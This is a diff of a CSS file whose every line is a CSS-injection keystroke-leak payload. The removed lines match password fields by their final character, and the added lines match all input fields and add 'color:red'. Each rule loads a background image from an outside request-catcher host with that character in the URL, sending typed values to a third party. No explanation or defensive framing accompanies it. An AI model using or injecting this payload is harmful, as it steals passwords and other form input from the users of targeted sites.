@@ -1,96 +1,96 @@
-input[type="password"][value$=" "] { background-image: url("https://asd.requestcatcher.com/log/+"); }
-input[type="password"][value$="!"] { background-image: url("https://asd.requestcatcher.com/log/%21"); }
-input[type="password"][value$="\""] { background-image: url("https://asd.requestcatcher.com/log/%22"); }
-input[type="password"][value$="#"] { background-image: url("https://asd.requestcatcher.com/log/%23"); }
-input[type="password"][value$="$"] { background-image: url("https://asd.requestcatcher.com/log/%24"); }
-input[type="password"][value$="%"] { background-image: url("https://asd.requestcatcher.com/log/%25"); }
-input[type="password"][value$="&"] { background-image: url("https://asd.requestcatcher.com/log/%26"); }
-input[type="password"][value$="'"] { background-image: url("https://asd.requestcatcher.com/log/%27"); }
-input[type="password"][value$="("] { background-image: url("https://asd.requestcatcher.com/log/%28"); }
-input[type="password"][value$=")"] { background-image: url("https://asd.requestcatcher.com/log/%29"); }
-input[type="password"][value$="*"] { background-image: url("https://asd.requestcatcher.com/log/%2A"); }
-input[type="password"][value$="+"] { background-image: url("https://asd.requestcatcher.com/log/%2B"); }
-input[type="password"][value$=","] { background-image: url("https://asd.requestcatcher.com/log/%2C"); }
-input[type="password"][value$="-"] { background-image: url("https://asd.requestcatcher.com/log/-"); }
-input[type="password"][value$="."] { background-image: url("https://asd.requestcatcher.com/log/."); }
-input[type="password"][value$="/"] { background-image: url("https://asd.requestcatcher.com/log/%2F"); }
-input[type="password"][value$="0"] { background-image: url("https://asd.requestcatcher.com/log/0"); }
-input[type="password"][value$="1"] { background-image: url("https://asd.requestcatcher.com/log/1"); }
-input[type="password"][value$="2"] { background-image: url("https://asd.requestcatcher.com/log/2"); }
-input[type="password"][value$="3"] { background-image: url("https://asd.requestcatcher.com/log/3"); }
-input[type="password"][value$="4"] { background-image: url("https://asd.requestcatcher.com/log/4"); }
-input[type="password"][value$="5"] { background-image: url("https://asd.requestcatcher.com/log/5"); }
-input[type="password"][value$="6"] { background-image: url("https://asd.requestcatcher.com/log/6"); }
-input[type="password"][value$="7"] { background-image: url("https://asd.requestcatcher.com/log/7"); }
-input[type="password"][value$="8"] { background-image: url("https://asd.requestcatcher.com/log/8"); }
-input[type="password"][value$="9"] { background-image: url("https://asd.requestcatcher.com/log/9"); }
-input[type="password"][value$=":"] { background-image: url("https://asd.requestcatcher.com/log/%3A"); }
-input[type="password"][value$=";"] { background-image: url("https://asd.requestcatcher.com/log/%3B"); }
-input[type="password"][value$="<"] { background-image: url("https://asd.requestcatcher.com/log/%3C"); }
-input[type="password"][value$="="] { background-image: url("https://asd.requestcatcher.com/log/%3D"); }
-input[type="password"][value$=">"] { background-image: url("https://asd.requestcatcher.com/log/%3E"); }
-input[type="password"][value$="?"] { background-image: url("https://asd.requestcatcher.com/log/%3F"); }
-input[type="password"][value$="@"] { background-image: url("https://asd.requestcatcher.com/log/%40"); }
-input[type="password"][value$="A"] { background-image: url("https://asd.requestcatcher.com/log/A"); }
-input[type="password"][value$="B"] { background-image: url("https://asd.requestcatcher.com/log/B"); }
-input[type="password"][value$="C"] { background-image: url("https://asd.requestcatcher.com/log/C"); }
-input[type="password"][value$="D"] { background-image: url("https://asd.requestcatcher.com/log/D"); }
-input[type="password"][value$="E"] { background-image: url("https://asd.requestcatcher.com/log/E"); }
-input[type="password"][value$="F"] { background-image: url("https://asd.requestcatcher.com/log/F"); }
-input[type="password"][value$="G"] { background-image: url("https://asd.requestcatcher.com/log/G"); }
-input[type="password"][value$="H"] { background-image: url("https://asd.requestcatcher.com/log/H"); }
-input[type="password"][value$="I"] { background-image: url("https://asd.requestcatcher.com/log/I"); }
-input[type="password"][value$="J"] { background-image: url("https://asd.requestcatcher.com/log/J"); }
-input[type="password"][value$="K"] { background-image: url("https://asd.requestcatcher.com/log/K"); }
-input[type="password"][value$="L"] { background-image: url("https://asd.requestcatcher.com/log/L"); }
-input[type="password"][value$="M"] { background-image: url("https://asd.requestcatcher.com/log/M"); }
-input[type="password"][value$="N"] { background-image: url("https://asd.requestcatcher.com/log/N"); }
-input[type="password"][value$="O"] { background-image: url("https://asd.requestcatcher.com/log/O"); }
-input[type="password"][value$="P"] { background-image: url("https://asd.requestcatcher.com/log/P"); }
-input[type="password"][value$="Q"] { background-image: url("https://asd.requestcatcher.com/log/Q"); }
-input[type="password"][value$="R"] { background-image: url("https://asd.requestcatcher.com/log/R"); }
-input[type="password"][value$="S"] { background-image: url("https://asd.requestcatcher.com/log/S"); }
-input[type="password"][value$="T"] { background-image: url("https://asd.requestcatcher.com/log/T"); }
-input[type="password"][value$="U"] { background-image: url("https://asd.requestcatcher.com/log/U"); }
-input[type="password"][value$="V"] { background-image: url("https://asd.requestcatcher.com/log/V"); }
-input[type="password"][value$="W"] { background-image: url("https://asd.requestcatcher.com/log/W"); }
-input[type="password"][value$="X"] { background-image: url("https://asd.requestcatcher.com/log/X"); }
-input[type="password"][value$="Y"] { background-image: url("https://asd.requestcatcher.com/log/Y"); }
-input[type="password"][value$="Z"] { background-image: url("https://asd.requestcatcher.com/log/Z"); }
-input[type="password"][value$="["] { background-image: url("https://asd.requestcatcher.com/log/%5B"); }
-input[type="password"][value$="\\"] { background-image: url("https://asd.requestcatcher.com/log/%5C"); }
-input[type="password"][value$="]"] { background-image: url("https://asd.requestcatcher.com/log/%5D"); }
-input[type="password"][value$="^"] { background-image: url("https://asd.requestcatcher.com/log/%5E"); }
-input[type="password"][value$="_"] { background-image: url("https://asd.requestcatcher.com/log/_"); }
-input[type="password"][value$="`"] { background-image: url("https://asd.requestcatcher.com/log/%60"); }
-input[type="password"][value$="a"] { background-image: url("https://asd.requestcatcher.com/log/a"); }
-input[type="password"][value$="b"] { background-image: url("https://asd.requestcatcher.com/log/b"); }
-input[type="password"][value$="c"] { background-image: url("https://asd.requestcatcher.com/log/c"); }
-input[type="password"][value$="d"] { background-image: url("https://asd.requestcatcher.com/log/d"); }
-input[type="password"][value$="e"] { background-image: url("https://asd.requestcatcher.com/log/e"); }
-input[type="password"][value$="f"] { background-image: url("https://asd.requestcatcher.com/log/f"); }
-input[type="password"][value$="g"] { background-image: url("https://asd.requestcatcher.com/log/g"); }
-input[type="password"][value$="h"] { background-image: url("https://asd.requestcatcher.com/log/h"); }
-input[type="password"][value$="i"] { background-image: url("https://asd.requestcatcher.com/log/i"); }
-input[type="password"][value$="j"] { background-image: url("https://asd.requestcatcher.com/log/j"); }
-input[type="password"][value$="k"] { background-image: url("https://asd.requestcatcher.com/log/k"); }
-input[type="password"][value$="l"] { background-image: url("https://asd.requestcatcher.com/log/l"); }
-input[type="password"][value$="m"] { background-image: url("https://asd.requestcatcher.com/log/m"); }
-input[type="password"][value$="n"] { background-image: url("https://asd.requestcatcher.com/log/n"); }
-input[type="password"][value$="o"] { background-image: url("https://asd.requestcatcher.com/log/o"); }
-input[type="password"][value$="p"] { background-image: url("https://asd.requestcatcher.com/log/p"); }
-input[type="password"][value$="q"] { background-image: url("https://asd.requestcatcher.com/log/q"); }
-input[type="password"][value$="r"] { background-image: url("https://asd.requestcatcher.com/log/r"); }
-input[type="password"][value$="s"] { background-image: url("https://asd.requestcatcher.com/log/s"); }
-input[type="password"][value$="t"] { background-image: url("https://asd.requestcatcher.com/log/t"); }
-input[type="password"][value$="u"] { background-image: url("https://asd.requestcatcher.com/log/u"); }
-input[type="password"][value$="v"] { background-image: url("https://asd.requestcatcher.com/log/v"); }
-input[type="password"][value$="w"] { background-image: url("https://asd.requestcatcher.com/log/w"); }
-input[type="password"][value$="x"] { background-image: url("https://asd.requestcatcher.com/log/x"); }
-input[type="password"][value$="y"] { background-image: url("https://asd.requestcatcher.com/log/y"); }
-input[type="password"][value$="z"] { background-image: url("https://asd.requestcatcher.com/log/z"); }
-input[type="password"][value$="{"] { background-image: url("https://asd.requestcatcher.com/log/%7B"); }
-input[type="password"][value$="|"] { background-image: url("https://asd.requestcatcher.com/log/%7C"); }
-input[type="password"][value$="\\}"] { background-image: url("https://asd.requestcatcher.com/log/%7D"); }
-input[type="password"][value$="~"] { background-image: url("https://asd.requestcatcher.com/log/~"); }
-input[type="password"][value$=""] { background-image: url("https://asd.requestcatcher.com/log/%7F"); }
+input[value$=" "] { background-image: url("https://asd.requestcatcher.com/log/+"); color:red; }
+input[value$="!"] { background-image: url("https://asd.requestcatcher.com/log/%21"); color:red; }
+input[value$="\""] { background-image: url("https://asd.requestcatcher.com/log/%22"); color:red; }
+input[value$="#"] { background-image: url("https://asd.requestcatcher.com/log/%23"); color:red; }
+input[value$="$"] { background-image: url("https://asd.requestcatcher.com/log/%24"); color:red; }
+input[value$="%"] { background-image: url("https://asd.requestcatcher.com/log/%25"); color:red; }
+input[value$="&"] { background-image: url("https://asd.requestcatcher.com/log/%26"); color:red; }
+input[value$="'"] { background-image: url("https://asd.requestcatcher.com/log/%27"); color:red; }
+input[value$="("] { background-image: url("https://asd.requestcatcher.com/log/%28"); color:red; }
+input[value$=")"] { background-image: url("https://asd.requestcatcher.com/log/%29"); color:red; }
+input[value$="*"] { background-image: url("https://asd.requestcatcher.com/log/%2A"); color:red; }
+input[value$="+"] { background-image: url("https://asd.requestcatcher.com/log/%2B"); color:red; }
+input[value$=","] { background-image: url("https://asd.requestcatcher.com/log/%2C"); color:red; }
+input[value$="-"] { background-image: url("https://asd.requestcatcher.com/log/-"); color:red; }
+input[value$="."] { background-image: url("https://asd.requestcatcher.com/log/."); color:red; }
+input[value$="/"] { background-image: url("https://asd.requestcatcher.com/log/%2F"); color:red; }
+input[value$="0"] { background-image: url("https://asd.requestcatcher.com/log/0"); color:red; }
+input[value$="1"] { background-image: url("https://asd.requestcatcher.com/log/1"); color:red; }
+input[value$="2"] { background-image: url("https://asd.requestcatcher.com/log/2"); color:red; }
+input[value$="3"] { background-image: url("https://asd.requestcatcher.com/log/3"); color:red; }
+input[value$="4"] { background-image: url("https://asd.requestcatcher.com/log/4"); color:red; }
+input[value$="5"] { background-image: url("https://asd.requestcatcher.com/log/5"); color:red; }
+input[value$="6"] { background-image: url("https://asd.requestcatcher.com/log/6"); color:red; }
+input[value$="7"] { background-image: url("https://asd.requestcatcher.com/log/7"); color:red; }
+input[value$="8"] { background-image: url("https://asd.requestcatcher.com/log/8"); color:red; }
+input[value$="9"] { background-image: url("https://asd.requestcatcher.com/log/9"); color:red; }
+input[value$=":"] { background-image: url("https://asd.requestcatcher.com/log/%3A"); color:red; }
+input[value$=";"] { background-image: url("https://asd.requestcatcher.com/log/%3B"); color:red; }
+input[value$="<"] { background-image: url("https://asd.requestcatcher.com/log/%3C"); color:red; }
+input[value$="="] { background-image: url("https://asd.requestcatcher.com/log/%3D"); color:red; }
+input[value$=">"] { background-image: url("https://asd.requestcatcher.com/log/%3E"); color:red; }
+input[value$="?"] { background-image: url("https://asd.requestcatcher.com/log/%3F"); color:red; }
+input[value$="@"] { background-image: url("https://asd.requestcatcher.com/log/%40"); color:red; }
+input[value$="A"] { background-image: url("https://asd.requestcatcher.com/log/A"); color:red; }
+input[value$="B"] { background-image: url("https://asd.requestcatcher.com/log/B"); color:red; }
+input[value$="C"] { background-image: url("https://asd.requestcatcher.com/log/C"); color:red; }
+input[value$="D"] { background-image: url("https://asd.requestcatcher.com/log/D"); color:red; }
+input[value$="E"] { background-image: url("https://asd.requestcatcher.com/log/E"); color:red; }
+input[value$="F"] { background-image: url("https://asd.requestcatcher.com/log/F"); color:red; }
+input[value$="G"] { background-image: url("https://asd.requestcatcher.com/log/G"); color:red; }
+input[value$="H"] { background-image: url("https://asd.requestcatcher.com/log/H"); color:red; }
+input[value$="I"] { background-image: url("https://asd.requestcatcher.com/log/I"); color:red; }
+input[value$="J"] { background-image: url("https://asd.requestcatcher.com/log/J"); color:red; }
+input[value$="K"] { background-image: url("https://asd.requestcatcher.com/log/K"); color:red; }
+input[value$="L"] { background-image: url("https://asd.requestcatcher.com/log/L"); color:red; }
+input[value$="M"] { background-image: url("https://asd.requestcatcher.com/log/M"); color:red; }
+input[value$="N"] { background-image: url("https://asd.requestcatcher.com/log/N"); color:red; }
+input[value$="O"] { background-image: url("https://asd.requestcatcher.com/log/O"); color:red; }
+input[value$="P"] { background-image: url("https://asd.requestcatcher.com/log/P"); color:red; }
+input[value$="Q"] { background-image: url("https://asd.requestcatcher.com/log/Q"); color:red; }
+input[value$="R"] { background-image: url("https://asd.requestcatcher.com/log/R"); color:red; }
+input[value$="S"] { background-image: url("https://asd.requestcatcher.com/log/S"); color:red; }
+input[value$="T"] { background-image: url("https://asd.requestcatcher.com/log/T"); color:red; }
+input[value$="U"] { background-image: url("https://asd.requestcatcher.com/log/U"); color:red; }
+input[value$="V"] { background-image: url("https://asd.requestcatcher.com/log/V"); color:red; }
+input[value$="W"] { background-image: url("https://asd.requestcatcher.com/log/W"); color:red; }
+input[value$="X"] { background-image: url("https://asd.requestcatcher.com/log/X"); color:red; }
+input[value$="Y"] { background-image: url("https://asd.requestcatcher.com/log/Y"); color:red; }
+input[value$="Z"] { background-image: url("https://asd.requestcatcher.com/log/Z"); color:red; }
+input[value$="["] { background-image: url("https://asd.requestcatcher.com/log/%5B"); color:red; }
+input[value$="\\"] { background-image: url("https://asd.requestcatcher.com/log/%5C"); color:red; }
+input[value$="]"] { background-image: url("https://asd.requestcatcher.com/log/%5D"); color:red; }
+input[value$="^"] { background-image: url("https://asd.requestcatcher.com/log/%5E"); color:red; }
+input[value$="_"] { background-image: url("https://asd.requestcatcher.com/log/_"); color:red; }
+input[value$="`"] { background-image: url("https://asd.requestcatcher.com/log/%60"); color:red; }
+input[value$="a"] { background-image: url("https://asd.requestcatcher.com/log/a"); color:red; }
+input[value$="b"] { background-image: url("https://asd.requestcatcher.com/log/b"); color:red; }
+input[value$="c"] { background-image: url("https://asd.requestcatcher.com/log/c"); color:red; }
+input[value$="d"] { background-image: url("https://asd.requestcatcher.com/log/d"); color:red; }
+input[value$="e"] { background-image: url("https://asd.requestcatcher.com/log/e"); color:red; }
+input[value$="f"] { background-image: url("https://asd.requestcatcher.com/log/f"); color:red; }
+input[value$="g"] { background-image: url("https://asd.requestcatcher.com/log/g"); color:red; }
+input[value$="h"] { background-image: url("https://asd.requestcatcher.com/log/h"); color:red; }
+input[value$="i"] { background-image: url("https://asd.requestcatcher.com/log/i"); color:red; }
+input[value$="j"] { background-image: url("https://asd.requestcatcher.com/log/j"); color:red; }
+input[value$="k"] { background-image: url("https://asd.requestcatcher.com/log/k"); color:red; }
+input[value$="l"] { background-image: url("https://asd.requestcatcher.com/log/l"); color:red; }
+input[value$="m"] { background-image: url("https://asd.requestcatcher.com/log/m"); color:red; }
+input[value$="n"] { background-image: url("https://asd.requestcatcher.com/log/n"); color:red; }
+input[value$="o"] { background-image: url("https://asd.requestcatcher.com/log/o"); color:red; }
+input[value$="p"] { background-image: url("https://asd.requestcatcher.com/log/p"); color:red; }
+input[value$="q"] { background-image: url("https://asd.requestcatcher.com/log/q"); color:red; }
+input[value$="r"] { background-image: url("https://asd.requestcatcher.com/log/r"); color:red; }
+input[value$="s"] { background-image: url("https://asd.requestcatcher.com/log/s"); color:red; }
+input[value$="t"] { background-image: url("https://asd.requestcatcher.com/log/t"); color:red; }
+input[value$="u"] { background-image: url("https://asd.requestcatcher.com/log/u"); color:red; }
+input[value$="v"] { background-image: url("https://asd.requestcatcher.com/log/v"); color:red; }
+input[value$="w"] { background-image: url("https://asd.requestcatcher.com/log/w"); color:red; }
+input[value$="x"] { background-image: url("https://asd.requestcatcher.com/log/x"); color:red; }
+input[value$="y"] { background-image: url("https://asd.requestcatcher.com/log/y"); color:red; }
+input[value$="z"] { background-image: url("https://asd.requestcatcher.com/log/z"); color:red; }
+input[value$="{"] { background-image: url("https://asd.requestcatcher.com/log/%7B"); color:red; }
+input[value$="|"] { background-image: url("https://asd.requestcatcher.com/log/%7C"); color:red; }
+input[value$="\\}"] { background-image: url("https://asd.requestcatcher.com/log/%7D"); color:red; }
+input[value$="~"] { background-image: url("https://asd.requestcatcher.com/log/~"); color:red; }
+input[value$=""] { background-image: url("https://asd.requestcatcher.com/log/%7F"); color:red; }
